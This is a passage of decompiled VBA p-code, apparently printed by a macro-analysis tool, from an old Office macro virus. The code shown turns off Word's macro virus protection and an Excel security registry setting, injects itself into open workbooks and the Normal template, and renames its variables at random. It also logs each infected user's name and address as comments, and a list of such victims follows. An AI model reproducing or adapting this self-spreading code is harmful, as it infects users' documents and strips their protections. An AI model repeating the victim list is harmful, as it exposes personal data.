' 	EndIfBlock 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Private Sub ZPOTPQB(ByRef VMDCKLDROSJ As String))
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	Dim (Const) 
' 	LitDI2 0x0030 
' 	VarDefn MLTHQEN
' 	LitDI2 0x000F 
' 	VarDefn FRVEIKQVDPK
' 	LitDI2 0x0005 
' 	VarDefn ZOGIBBVMHPWTQ
' 	LitDI2 0x0041 
' 	VarDefn CUMDGILXHZB
' 	LitDI2 0x005A 
' 	VarDefn HQKTZXCK
' 	LitDI2 0x0001 
' 	VarDefn XKBSHVGYMQQPIC
' 	LitVarSpecial (True)
' 	VarDefn INJMFGFXIAXHZ
' 	LitVarSpecial (False)
' 	VarDefn LYNBHTCKCFL
' Line #93:
' 	Dim 
' 	VarDefn HPGPSFXHANTY
' 	VarDefn UHUEJIQABBGXTmp
' 	VarDefn HFDKXCLWOEKVOC
' 	Ld XKBSHVGYMQQPIC 
' 	Ld MLTHQEN 
' 	VarDefn UHUEJIQABBGX
' 	Ld XKBSHVGYMQQPIC 
' 	Ld MLTHQEN 
' 	VarDefn UHUEJIQABBGX2 (As String)
' Line #94:
' 	Dim 
' 	VarDefn POIZGFN
' 	VarDefn QXEBR
' 	VarDefn SGXONQLCPQZC (As Integer)
' Line #95:
' 	Dim 
' 	VarDefn CCPIIV (As Boolean)
' Line #96:
' 	LitStr 0x0233 "VMDCKLDROSJ MLTHQEN UHUEJIQABBGX UHUEJIQABBGX2 HFDKXCLWOEKVOC POIZGFN QXEBR SGXONQLCPQZC CCPIIV ZPOTPQB FRVEIKQVDPK ZOGIBBVMHPWTQ CUMDGILXHZB HQKTZXCK XKBSHVGYMQQPIC HPGPSFXHANTY UHUEJIQABBGXTmp PPKHSLYCN WRQZYPXLVGFQY IKPKZPAKGWBBJTX KBZJOHNI SQCSDOXDP FOOVZJA FAMZKCGP KDSJHDCIHPNYD VGTCCPRRFS STSIBTYLRCCHMF HELJBVMLSLGPBO KDSJHDCIHPNYDTmp HZOXZWR FESVRYKFHBJMJ RPZRXFMOI INJMFGFXIAXHZ LYNBHTCKCFL OMASQWETEHZ KJUYYLO CBXVFKAEKMCBM XDHENU PNEQXHBUONCVHCK SFHYGPHRHFKQOZQ SYUJIMJGXA YLUUOYWGEFQEYJE ESHIT KMYIAWITGZYIPA JEPMGVVHOYOGM WRKBW UORXKHRFRFDPH WGBWGOF"
' 	St HPGPSFXHANTY 
' Line #97:
' 	ArgsCall Read 0x0000 
' Line #98:
' 	Ld XKBSHVGYMQQPIC 
' 	St QXEBR 
' Line #99:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld HPGPSFXHANTY 
' 	FnLen 
' 	For 
' Line #100:
' 	Ld HPGPSFXHANTY 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Ld POIZGFN 
' 	Ld HPGPSFXHANTY 
' 	FnLen 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #101:
' 	Ld POIZGFN 
' 	Ld HPGPSFXHANTY 
' 	FnLen 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld UHUEJIQABBGXTmp 
' 	Ld HPGPSFXHANTY 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UHUEJIQABBGXTmp 
' 	EndIf 
' Line #102:
' 	StartForVariable 
' 	Ld SGXONQLCPQZC 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld FRVEIKQVDPK 
' 	Ld ZOGIBBVMHPWTQ 
' 	Sub 
' 	Ld XKBSHVGYMQQPIC 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld ZOGIBBVMHPWTQ 
' 	Add 
' 	FnInt 
' 	For 
' Line #103:
' 	Ld QXEBR 
' 	ArgsLd UHUEJIQABBGX2 0x0001 
' 	Ld HQKTZXCK 
' 	Ld CUMDGILXHZB 
' 	Sub 
' 	Ld XKBSHVGYMQQPIC 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld CUMDGILXHZB 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld QXEBR 
' 	ArgsSt UHUEJIQABBGX2 0x0001 
' Line #104:
' 	StartForVariable 
' 	Ld SGXONQLCPQZC 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld UHUEJIQABBGXTmp 
' 	Ld QXEBR 
' 	ArgsSt UHUEJIQABBGX 0x0001 
' Line #106:
' 	LitStr 0x0000 ""
' 	St UHUEJIQABBGXTmp 
' Line #107:
' 	Ld QXEBR 
' 	Ld XKBSHVGYMQQPIC 
' 	Add 
' 	St QXEBR 
' Line #108:
' 	ElseBlock 
' Line #109:
' 	Ld UHUEJIQABBGXTmp 
' 	Ld HPGPSFXHANTY 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UHUEJIQABBGXTmp 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	Ld LYNBHTCKCFL 
' 	St CCPIIV 
' Line #113:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld VMDCKLDROSJ 
' 	FnLen 
' 	For 
' Line #114:
' 	StartForVariable 
' 	Ld QXEBR 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld MLTHQEN 
' 	For 
' Line #115:
' 	Ld VMDCKLDROSJ 
' 	Ld POIZGFN 
' 	Ld QXEBR 
' 	ArgsLd UHUEJIQABBGX 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld QXEBR 
' 	ArgsLd UHUEJIQABBGX 0x0001 
' 	Eq 
' 	IfBlock 
' Line #116:
' 	Ld HFDKXCLWOEKVOC 
' 	Ld QXEBR 
' 	ArgsLd UHUEJIQABBGX2 0x0001 
' 	Concat 
' 	St HFDKXCLWOEKVOC 
' Line #117:
' 	Ld POIZGFN 
' 	Ld QXEBR 
' 	ArgsLd UHUEJIQABBGX 0x0001 
' 	FnLen 
' 	Add 
' 	Ld XKBSHVGYMQQPIC 
' 	Sub 
' 	St POIZGFN 
' Line #118:
' 	Ld INJMFGFXIAXHZ 
' 	St CCPIIV 
' Line #119:
' 	ExitFor 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	StartForVariable 
' 	Ld QXEBR 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	Ld CCPIIV 
' 	Ld LYNBHTCKCFL 
' 	Eq 
' 	IfBlock 
' Line #123:
' 	Ld HFDKXCLWOEKVOC 
' 	Ld VMDCKLDROSJ 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St HFDKXCLWOEKVOC 
' Line #124:
' 	ElseBlock 
' Line #125:
' 	Ld LYNBHTCKCFL 
' 	St CCPIIV 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	Ld HFDKXCLWOEKVOC 
' 	St VMDCKLDROSJ 
' Line #129:
' 	EndSub 
' Line #130:
' 	FuncDefn (Private Sub FAMZKCGP(ByRef VMDCKLDROSJ As String))
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' 	Dim (Const) 
' 	LitStr 0x0002 "' "
' 	VarDefn HELJBVMLSLGPBO
' 	LitDI2 0x0001 
' 	VarDefn XKBSHVGYMQQPIC
' Line #133:
' 	Dim (Const) 
' 	LitStr 0x0011 "hh:mm:ss: AMPM - "
' 	VarDefn XDHENU
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	VarDefn PNEQXHBUONCVHCK
' Line #134:
' 	Dim 
' 	VarDefn KDSJHDCIHPNYDTmp
' 	VarDefn KDSJHDCIHPNYD
' 	VarDefn HZOXZWR
' 	VarDefn FESVRYKFHBJMJ
' 	VarDefn VGTCCPRRFS
' 	VarDefn STSIBTYLRCCHMF (As String)
' Line #135:
' 	Dim 
' 	VarDefn POIZGFN (As Integer)
' Line #136:
' 	LitDI2 0x000A 
' 	Ld XKBSHVGYMQQPIC 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St VGTCCPRRFS 
' Line #137:
' 	Ld Application 
' 	MemLd UserAddress 
' 	St KDSJHDCIHPNYD 
' Line #138:
' 	Ld Time 
' 	Ld XDHENU 
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	Ld PNEQXHBUONCVHCK 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St FESVRYKFHBJMJ 
' Line #139:
' 	Ld XKBSHVGYMQQPIC 
' 	LitDI2 0x000A 
' 	Mul 
' 	ArgsLd Chr 0x0001 
' 	St STSIBTYLRCCHMF 
' Line #140:
' 	Ld Application 
' 	MemLd UserName 
' 	St HZOXZWR 
' Line #141:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld KDSJHDCIHPNYD 
' 	FnLen 
' 	For 
' Line #142:
' 	Ld KDSJHDCIHPNYD 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	Ld VGTCCPRRFS 
' 	Ne 
' 	IfBlock 
' Line #143:
' 	Ld KDSJHDCIHPNYD 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	Ld STSIBTYLRCCHMF 
' 	Ne 
' 	IfBlock 
' Line #144:
' 	Ld KDSJHDCIHPNYDTmp 
' 	Ld KDSJHDCIHPNYD 
' 	Ld POIZGFN 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St KDSJHDCIHPNYDTmp 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	ElseBlock 
' Line #147:
' 	Ld KDSJHDCIHPNYDTmp 
' 	Ld VGTCCPRRFS 
' 	Concat 
' 	Ld HELJBVMLSLGPBO 
' 	Concat 
' 	St KDSJHDCIHPNYDTmp 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	Ld VMDCKLDROSJ 
' 	Ld VGTCCPRRFS 
' 	Concat 
' 	Ld HELJBVMLSLGPBO 
' 	Concat 
' 	Ld FESVRYKFHBJMJ 
' 	Concat 
' 	Ld VGTCCPRRFS 
' 	Concat 
' 	Ld HELJBVMLSLGPBO 
' 	Concat 
' 	Ld HZOXZWR 
' 	Concat 
' 	Ld VGTCCPRRFS 
' 	Concat 
' 	Ld HELJBVMLSLGPBO 
' 	Concat 
' 	Ld KDSJHDCIHPNYD 
' 	Concat 
' 	Ld VGTCCPRRFS 
' 	Concat 
' 	St VMDCKLDROSJ 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Private Sub JEPMGVVHOYOGM(ByVal VMDCKLDROSJ As String))
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	Dim 
' 	VarDefn WGBWGOF (As Long)
' Line #155:
' 	Dim 
' 	VarDefn SYUJIMJGXA (As Object)
' Line #156:
' 	Dim 
' 	VarDefn WRKBW
' 	VarDefn UORXKHRFRFDPH (As String)
' Line #157:
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	St WRKBW 
' Line #158:
' 	LitHI2 0x0000 
' 	St WGBWGOF 
' Line #159:
' 	LitStr 0x0008 "Options6"
' 	St UORXKHRFRFDPH 
' Line #160:
' 	Ld WGBWGOF 
' 	LitStr 0x0000 ""
' 	Ld WRKBW 
' 	Ld UORXKHRFRFDPH 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #161:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set SYUJIMJGXA 
' Line #162:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn XKBSHVGYMQQPIC
' 	LitDI2 0x0000 
' 	VarDefn OMASQWETEHZ
' Line #163:
' 	Dim 
' 	VarDefn ESHIT (As String)
' Line #164:
' 	Dim 
' 	VarDefn POIZGFN
' 	VarDefn QXEBR (As Integer)
' Line #165:
' 	LitStr 0x000C "ThisWorkbook"
' 	St ESHIT 
' Line #166:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #167:
' 	StartForVariable 
' 	Ld QXEBR 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld POIZGFN 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #168:
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OMASQWETEHZ 
' 	Eq 
' 	IfBlock 
' Line #169:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld VMDCKLDROSJ 
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #170:
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ESHIT 
' 	Eq 
' 	IfBlock 
' Line #171:
' 	LitDI2 0x0021 
' 	Ld XKBSHVGYMQQPIC 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #172:
' 	ElseBlock 
' Line #173:
' 	Ld XKBSHVGYMQQPIC 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld SYUJIMJGXA 
' 	MemLd Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	EndIfBlock 
' Line #176:
' 	StartForVariable 
' 	Ld QXEBR 
' 	EndForVariable 
' 	NextVar 
' Line #177:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	NextVar 
' Line #178:
' 	SetStmt 
' 	LitNothing 
' 	Set SYUJIMJGXA 
' Line #179:
' 	EndSub 
' Line #180:
' 	FuncDefn (Private Sub KMYIAWITGZYIPA(ByVal VMDCKLDROSJ As String))
' Line #181:
' 	OnError (Resume Next) 
' Line #182:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn INJMFGFXIAXHZ
' 	LitVarSpecial (False)
' 	VarDefn LYNBHTCKCFL
' 	LitDI2 0x0001 
' 	VarDefn XKBSHVGYMQQPIC
' 	LitDI2 0x0000 
' 	VarDefn OMASQWETEHZ
' Line #183:
' 	Dim 
' 	VarDefn YLUUOYWGEFQEYJE (As Object)
' Line #184:
' 	Dim 
' 	VarDefn WRQZYPXLVGFQY (As Boolean)
' Line #185:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set YLUUOYWGEFQEYJE 
' Line #186:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld YLUUOYWGEFQEYJE 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OMASQWETEHZ 
' 	Eq 
' 	IfBlock 
' Line #187:
' 	Ld YLUUOYWGEFQEYJE 
' 	MemLd NormalTemplate 
' 	MemLd Saved 
' 	St WRQZYPXLVGFQY 
' Line #188:
' 	Ld LYNBHTCKCFL 
' 	Ld YLUUOYWGEFQEYJE 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #189:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld VMDCKLDROSJ 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld YLUUOYWGEFQEYJE 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #190:
' 	Ld WRQZYPXLVGFQY 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld YLUUOYWGEFQEYJE 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	SetStmt 
' 	LitNothing 
' 	Set YLUUOYWGEFQEYJE 
' Line #193:
' 	EndSub 
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0026 " 09:50:09: AM - Wednesday, 10 Feb 1999"
' Line #196:
' 	QuoteRem 0x0000 0x000B " Al Peabody"
' Line #197:
' 	QuoteRem 0x0000 0x0018 " 1634 Orchard Beach Road"
' Line #198:
' 	Reparse 0x0013 "Annapolis, MD 21401"
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0023 " 09:42:15: AM - Monday, 22 Feb 1999"
' Line #201:
' 	QuoteRem 0x0000 0x000F " Sergey Morozov"
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' Line #204:
' 	QuoteRem 0x0000 0x0024 " 09:49:26: AM - ÷ĺňâĺđă, 11 ěŕđ 1999"
' Line #205:
' 	QuoteRem 0x0000 0x0008 " Advisor"
' Line #206:
' 	QuoteRem 0x0000 0x0000 ""
' Line #207:
' Line #208:
' 	QuoteRem 0x0000 0x0026 " 04:16:54:  - ďîíĺäĺëüíčę, 22 ěŕđ 1999"
' Line #209:
' 	QuoteRem 0x0000 0x0004 " ***"
' Line #210:
' 	QuoteRem 0x0000 0x0000 ""
' Line #211:
' Line #212:
' 	QuoteRem 0x0000 0x0022 " 11:52:11:  - ÷ĺňâĺđă, 15 ŕďđ 1999"
' Line #213:
' 	QuoteRem 0x0000 0x000E " Freddy Kruger"
' Line #214:
' 	QuoteRem 0x0000 0x0000 ""
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x0022 " 10:39:12:  - ÷ĺňâĺđă, 20 ěŕé 1999"
' Line #217:
' 	QuoteRem 0x0000 0x0005 " Andy"
' Line #218:
' 	QuoteRem 0x0000 0x0000 ""
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0020 " 02:41:47:  - ńđĺäŕ, 26 ěŕé 1999"
' Line #221:
' 	QuoteRem 0x0000 0x0005 " Andy"
' Line #222:
' 	QuoteRem 0x0000 0x0000 ""
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x0026 " 10:00:09:  - ďîíĺäĺëüíčę, 31 ěŕé 1999"
' Line #225:
' 	QuoteRem 0x0000 0x0005 " Andy"
' Line #226:
' 	QuoteRem 0x0000 0x0000 ""
' Line #227:
' Line #228:
' 	QuoteRem 0x0000 0x0025 " 03:33:09:  - ďîíĺäĺëüíčę, 1 ˙íâ 1996"
' Line #229:
' 	QuoteRem 0x0000 0x0009 " Laborant"
' Line #230:
' 	QuoteRem 0x0000 0x0000 ""
' Line #231:
' Line #232:
' 	QuoteRem 0x0000 0x001F " 01:48:28:  - ńđĺäŕ, 2 čţí 1999"
' Line #233:
' 	QuoteRem 0x0000 0x0006 " User4"
' Line #234:
' 	QuoteRem 0x0000 0x0000 ""
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x0022 " 03:44:53:  - ÷ĺňâĺđă, 11 čţí 1998"
' Line #237:
' 	QuoteRem 0x0000 0x0004 " ĘÎÄ"
' Line #238:
' 	QuoteRem 0x0000 0x0000 ""
' Line #239:
' Line #240:
' 	QuoteRem 0x0000 0x0022 " 09:41:05:  - ÷ĺňâĺđă, 13 čţí 1996"
' Line #241:
' 	QuoteRem 0x0000 0x0008 " Řňŕíüęî"
' Line #242:
' 	QuoteRem 0x0000 0x0000 ""
' Line #243:
' Line #244:
' 	QuoteRem 0x0000 0x0022 " 03:24:12:  - âňîđíčę, 15 čţí 1999"
' Line #245:
' 	QuoteRem 0x0000 0x000B " Ďîďîâ Ä.Ŕ."
' Line #246:
' 	QuoteRem 0x0000 0x0000 ""
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x0022 " 04:33:12:  - âňîđíčę, 15 čţí 1999"
' Line #249:
' 	QuoteRem 0x0000 0x000C " Ďîďîâ Ä. Ŕ."
' Line #250:
' 	QuoteRem 0x0000 0x0000 ""
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0020 " 12:29:49:  - ńđĺäŕ, 30 čţí 1999"
' Line #253:
' 	QuoteRem 0x0000 0x000B " Ďîďîâ Ä.Ŕ."
' Line #254:
' 	QuoteRem 0x0000 0x0000 ""
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x0026 " 03:42:00:  - âîńęđĺńĺíüĺ, 12 ńĺí 1999"
' Line #257:
' 	QuoteRem 0x0000 0x0006 " -UFO-"
' Line #258:
' 	QuoteRem 0x0000 0x0000 ""
' Line #259:
' Line #260:
' 	QuoteRem 0x0000 0x0025 " 03:27:12:  - âîńęđĺńĺíüĺ, 5 äĺę 1999"
' Line #261:
' 	QuoteRem 0x0000 0x0005 " Îëĺă"
' Line #262:
' 	QuoteRem 0x0000 0x0000 ""
' Line #263:
' Line #264:
' 	QuoteRem 0x0000 0x0026 " 01:47:48:  - âîńęđĺńĺíüĺ, 12 äĺę 1999"
' Line #265:
' 	QuoteRem 0x0000 0x001C " Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷"
' Line #266:
' 	QuoteRem 0x0000 0x0000 ""
' Line #267:
' Line #268:
' 	QuoteRem 0x0000 0x0020 " 09:22:00:  - ńđĺäŕ, 12 ˙íâ 2000"
' Line #269:
' 	QuoteRem 0x0000 0x001C " Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷"
' Line #270:
' 	QuoteRem 0x0000 0x0000 ""
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0026 " 11:25:35:  - âîńęđĺńĺíüĺ, 27 ěŕé 2001"
' Line #273:
' 	QuoteRem 0x0000 0x001C " Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷"
' Line #274:
' 	QuoteRem 0x0000 0x0000 ""
' Line #275:
' Line #276:
' 	FuncDefn (Private Sub Document_New())
' Line #277:
' Line #278:
' 	EndSub 
' Line #279:
' Line #280:
' 	FuncDefn (Private Sub Document_Open())
' Line #281:
' Line #282:
' 	EndSub 
' Line #283:
' 	QuoteRem 0x0000 0x0026 " 08:15:17:  - ďîíĺäĺëüíčę, 10 ńĺí 2001"
' Line #284:
' 	QuoteRem 0x0000 0x001E " Ěóőŕěĺäü˙đîâ Ěŕđŕň Đŕâčëüĺâč÷"
' Line #285:
' 	QuoteRem 0x0000 0x0000 ""
' Line #286:
' Line #287:
' 	QuoteRem 0x0000 0x0022 " 02:41:49:  - âňîđíčę, 25 ńĺí 2001"
' Line #288:
' 	QuoteRem 0x0000 0x0005 " Ŕëëŕ"
' Line #289:
' 	QuoteRem 0x0000 0x0000 ""
' Line #290:
' Line #291:
' 	QuoteRem 0x0000 0x0022 " 05:11:18:  - ď˙ňíčöŕ, 26 îęň 2001"
' Line #292:
' 	QuoteRem 0x0000 0x0005 " Ŕëëŕ"
' Line #293:
' 	QuoteRem 0x0000 0x0000 ""
' Line #294:
' Line #295:
' 	QuoteRem 0x0000 0x0026 " 11:08:41:  - âîńęđĺńĺíüĺ, 23 äĺę 2001"
' Line #296:
' 	QuoteRem 0x0000 0x000C " Ďóäîâŕ Ĺ.Â."
' Line #297:
' 	QuoteRem 0x0000 0x0000 ""
' Line #298:
' Line #299:
' 	QuoteRem 0x0000 0x0022 " 12:00:08:  - âňîđíčę, 16 ŕďđ 2002"
' Line #300:
' 	QuoteRem 0x0000 0x0007 " Řęóíîâ"
' Line #301:
' 	QuoteRem 0x0000 0x0000 ""
' Line #302:
' Line #303:
' 	QuoteRem 0x0000 0x0022 " 09:41:05:  - âňîđíčę, 22 ŕďđ 1997"
' Line #304:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #305:
' 	QuoteRem 0x0000 0x0000 ""
' Line #306:
' Line #307:
' 	QuoteRem 0x0000 0x0022 " 01:59:49:  - âňîđíčę, 23 Ŕďđ 2002"
' Line #308:
' 	QuoteRem 0x0000 0x0013 " Patient Of Dr.OGen"
' Line #309:
' 	QuoteRem 0x0000 0x0000 ""
' Line #310:
' Line #311:
' 	QuoteRem 0x0000 0x0021 " 09:56:47:  - âňîđíčę, 7 ěŕé 2002"
' Line #312:
' 	QuoteRem 0x0000 0x0010 " Äŕâë˙ňîâ Čëüäóń"
' Line #313:
' 	QuoteRem 0x0000 0x0000 ""
' Line #314:
' Line #315:
' 	QuoteRem 0x0000 0x0025 " 10:14:44:  - ďîíĺäĺëüíčę, 3 čţí 2002"
' Line #316:
' 	QuoteRem 0x0000 0x0010 " Äŕâë˙ňîâ Čëüäóń"
' Line #317:
' 	QuoteRem 0x0000 0x0000 ""
' Line #318:
' Line #319:
' 	QuoteRem 0x0000 0x0022 " 02:49:01:  - âňîđíčę, 11 čţí 2002"
' Line #320:
' 	QuoteRem 0x0000 0x000E " Ŕäěčíčńňđŕňîđ"
' Line #321:
' 	QuoteRem 0x0000 0x0000 ""
' Line #322:
' Line #323:
' 	QuoteRem 0x0000 0x0021 " 10:36:55:  - ď˙ňíčöŕ, 5 čţë 2002"
' Line #324:
' 	QuoteRem 0x0000 0x0002 " 1"
' Line #325:
' 	QuoteRem 0x0000 0x0000 ""
' Line #326:
' Line #327:
' 	QuoteRem 0x0000 0x0021 " 06:19:01:  - ď˙ňíčöŕ, 5 čţë 2002"
' Line #328:
' 	QuoteRem 0x0000 0x000E " Ŕäěčíčńňđŕňîđ"
' Line #329:
' 	QuoteRem 0x0000 0x0000 ""
' Line #330:
' Line #331:
' 	QuoteRem 0x0000 0x0020 " 05:08:26:  - ńđĺäŕ, 24 čţë 2002"
' Line #332:
' 	QuoteRem 0x0000 0x000E " Ŕäěčíčńňđŕňîđ"
' Line #333:
' 	QuoteRem 0x0000 0x0000 ""
' Line #334:
' Line #335:
' 	QuoteRem 0x0000 0x0020 " 09:32:12:  - ńđĺäŕ, 31 čţë 2002"
' Line #336:
' 	QuoteRem 0x0000 0x000E " Ŕäěčíčńňđŕňîđ"
' Line #337:
' 	QuoteRem 0x0000 0x0000 ""
' Line #338:
' Line #339:
' 	QuoteRem 0x0000 0x0020 " 05:12:55:  - ńđĺäŕ, 31 čţë 2002"
' Line #340:
' 	QuoteRem 0x0000 0x0008 " RAFIKOV"
' Line #341:
' 	QuoteRem 0x0000 0x0000 ""
' Line #342:
' Line #343:
' 	QuoteRem 0x0000 0x0021 " 08:59:32:  - âňîđíčę, 5 íî˙ 2002"
' Line #344:
' 	QuoteRem 0x0000 0x0008 " RAFIKOV"
' Line #345:
' 	QuoteRem 0x0000 0x0000 ""
' Line #346:
' Line #347:
' 	QuoteRem 0x0000 0x0020 " 11:25:16:  - ńđĺäŕ, 27 íî˙ 2002"
' Line #348:
' 	QuoteRem 0x0000 0x0008 " Ňîęŕđĺâ"
' Line #349:
' 	QuoteRem 0x0000 0x0000 ""
' Line #350:
' Line #351:
' 	QuoteRem 0x0000 0x0021 " 11:49:42:  - âňîđíčę, 3 äĺę 2002"
' Line #352:
' 	QuoteRem 0x0000 0x0004 " MBT"
' Line #353:
' 	QuoteRem 0x0000 0x0000 ""
' Line #354:
' Line #355:
' 	QuoteRem 0x0000 0x0021 " 01:56:51:  - ńóááîňŕ, 4 ˙íâ 2003"
' Line #356:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #357:
' 	QuoteRem 0x0000 0x0000 ""
' Line #358:
' Line #359:
